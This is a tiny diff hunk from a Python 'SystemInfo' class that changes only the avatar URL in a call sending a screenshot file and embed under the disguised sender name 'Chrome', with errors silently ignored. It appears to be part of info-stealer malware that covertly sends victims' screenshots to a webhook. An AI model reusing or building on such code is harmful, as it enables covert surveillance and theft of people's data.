@@ -57,7 +57,7 @@ class SystemInfo():
                 embed=embed,
                 file=File('.\\screenshot.png', filename='screenshot.png'),
                 username="Chrome",
-                avatar_url="https://i.imgur.com/HjzfjfR.png"
+                avatar_url="https://i.imgur.com/ObHdFbI.png"
             )
         except:
             pass
